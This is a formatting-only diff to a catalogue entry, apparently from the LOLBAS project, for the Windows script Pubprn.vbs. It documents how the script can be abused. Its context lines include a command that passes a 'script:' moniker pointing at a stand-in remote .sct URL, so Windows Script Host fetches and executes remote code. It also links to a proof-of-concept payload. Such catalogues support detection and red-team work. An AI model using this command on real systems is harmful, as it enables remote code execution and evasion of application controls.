@@ -2,7 +2,7 @@
 Name: Pubprn.vbs
 Description:
 Author: 'Oddvar Moe'
-Created: '2018-05-25'
+Created: 2018-05-25
 Commands:
   - Command: pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
     Description: Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection
@@ -15,7 +15,7 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs
   - Path: C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs
-Code_Sample: 
+Code_Sample:
   - Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSScripts/Payload/Pubprn_calc.sct
 Detection:
   - IOC:
